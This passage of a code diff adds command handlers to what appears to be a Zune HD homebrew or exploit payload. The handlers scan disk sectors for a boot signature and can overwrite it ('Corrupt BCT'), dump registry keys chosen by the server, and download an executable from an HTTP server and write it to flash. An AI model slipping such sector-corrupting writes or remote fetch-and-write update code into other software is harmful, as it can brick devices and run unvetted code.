+						resp[off+3] = (bytesRead >> 8) & 0xFF;
+						resp[off+4] = readErr & 0xFF;
+						resp[off+5] = (readErr >> 8) & 0xFF;
+					}
+
+					// Append sector data to response (cap at 2048 per device)
+					if (bytesRead > 2048) bytesRead = 2048;
+					if (bytesRead > 0 && resp_len + bytesRead <= 8192) {
+						memcpy(resp + resp_len, sector, bytesRead);
+						resp_len += bytesRead;
+					}
+
+					// Check for ECEC
+					for (u32 i = 0; i + 3 < bytesRead; i++) {
+						if (sector[i]=='E' && sector[i+1]=='C' && sector[i+2]=='E' && sector[i+3]=='C') {
+							resp[28] = 1; // ecec_found flag
+							resp[29] = d; // which device
+							resp[30] = i & 0xFF;
+							resp[31] = (i >> 8) & 0xFF;
+							best_dev = d;
+							best_ecec_off = i;
+
+							if (subcmd == 1) {
+								// Corrupt BCT
+								sector[i] = 0;
+								sector[i+1] = 0;
+								sector[i+2] = 0;
+								sector[i+3] = 0;
+								SetFilePointer(h, 0, NULL, FILE_BEGIN);
+								DWORD bytesWritten = 0;
+								BOOL wok = WriteFile(h, sector, 512, &bytesWritten, NULL);
+								resp[2] = wok ? 0x10 : 0x11;
+								resp[3] = bytesWritten & 0xFF;
+							}
+							break;
+						}
+					}
+
+					n_found++;
+					CloseHandle(h);
+				}
+				resp[1] = n_found;
+
+			} else if (cmd[0] == 23) {
+				// Cmd 23: Registry dump -- enumerate keys and values
+				// subcmd 0: dump HKLM\System\StorageManager
+				// subcmd 1: dump HKLM\Drivers\BlockDevice
+				// subcmd 2: dump custom path (path in cmd bytes 2-31 as ASCII)
+				HKEY root = HKEY_LOCAL_MACHINE;
+				LPCWSTR paths[] = {
+					L"System\\StorageManager",
+					L"Drivers\\BlockDevice",
+					NULL
+				};
+
+				// Build path from subcmd or custom
+				WCHAR regpath[128];
+				memset(regpath, 0, sizeof(regpath));
+				u32 sub = cmd[1];
+				if (sub < 2 && paths[sub]) {
+					wcscpy(regpath, paths[sub]);
+				} else {
+					// Convert ASCII from cmd[2..31] to wide
+					for (int i = 0; i < 29 && cmd[2+i]; i++)
+						regpath[i] = (WCHAR)cmd[2+i];
+				}
+
+				resp_len = 32;
+				HKEY hk;
+				LONG rc = RegOpenKeyExW(root, regpath, 0, KEY_READ, &hk);
+				resp[1] = (rc == ERROR_SUCCESS) ? 1 : 0;
+				*(u32*)&resp[4] = (u32)rc;
+
+				if (rc == ERROR_SUCCESS) {
+					// Enumerate subkeys
+					WCHAR subkey[128];
+					for (DWORD i = 0; ; i++) {
+						DWORD namelen = 128;
+						if (RegEnumKeyExW(hk, i, subkey, &namelen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
+							break;
+						// Append as ASCII to response
+						for (DWORD j = 0; j < namelen && resp_len < 8000; j++)
+							resp[resp_len++] = (unsigned char)(subkey[j] & 0x7F);
+						if (resp_len < 8000) resp[resp_len++] = '\n';
+					}
+					// Enumerate values
+					if (resp_len < 8000) resp[resp_len++] = '-';
+					if (resp_len < 8000) resp[resp_len++] = '\n';
+					WCHAR valname[128];
+					BYTE valdata[256];
+					for (DWORD i = 0; ; i++) {
+						DWORD namelen = 128;
+						DWORD datalen = 256;
+						DWORD type = 0;
+						if (RegEnumValueW(hk, i, valname, &namelen, NULL, &type, valdata, &datalen) != ERROR_SUCCESS)
+							break;
+						// Format: "name=type:hex\n"
+						for (DWORD j = 0; j < namelen && resp_len < 7900; j++)
+							resp[resp_len++] = (unsigned char)(valname[j] & 0x7F);
+						resp[resp_len++] = '=';
+						// Type as digit
+						resp[resp_len++] = '0' + (type % 10);
+						resp[resp_len++] = ':';
+						// Data as hex (first 32 bytes)
+						for (DWORD j = 0; j < datalen && j < 32 && resp_len < 7950; j++) {
+							unsigned char hi = (valdata[j] >> 4) & 0xF;
+							unsigned char lo = valdata[j] & 0xF;
+							resp[resp_len++] = hi < 10 ? '0'+hi : 'a'+hi-10;
+							resp[resp_len++] = lo < 10 ? '0'+lo : 'a'+lo-10;
+						}
+						if (resp_len < 8000) resp[resp_len++] = '\n';
+					}
+					RegCloseKey(hk);
+				}
+
+			} else if (cmd[0] == 99) {
+				// Self-update: download new payload from httpserv and write to \Flash2\
+				// Place the new binary at: ZuneHD/zuneslayer_debug/dumps/nativeapp_update.exe
+				// httpserv serves it at GET /upload/nativeapp_update.exe (via dumps dir)
+				unsigned char* update_buf = (unsigned char*)malloc(256 * 1024);
+				if (update_buf) {
+					int got = http_get("/nativeapp_update.exe", update_buf, 256 * 1024);
+					if (got > 1024) {
+						DeleteFileW(L"\\Flash2\\payload_new.exe");
+						HANDLE hf = CreateFileW(L"\\Flash2\\payload_new.exe",
+							GENERIC_WRITE, 0, NULL, 2, FILE_ATTRIBUTE_NORMAL, NULL);
+						if (hf != INVALID_HANDLE_VALUE) {
+							DWORD written = 0;
+							WriteFile(hf, update_buf, got, &written, NULL);
+							CloseHandle(hf);
+							resp[1] = 1; // success
+							*(u32*)&resp[4] = written;
+						} else {
+							resp[1] = 2; // CreateFile failed
+							*(u32*)&resp[4] = GetLastError();
+						}
+					} else {
+						resp[1] = 3; // download failed
+						*(u32*)&resp[4] = got;
+					}
+					free(update_buf);
+				} else {
+					resp[1] = 4; // malloc failed
+				}
+
+			} else {
+				resp[0] = 0xFF; // unknown command
+			}
+
+			http_post_response(resp, resp_len);
 		}
 	}
 
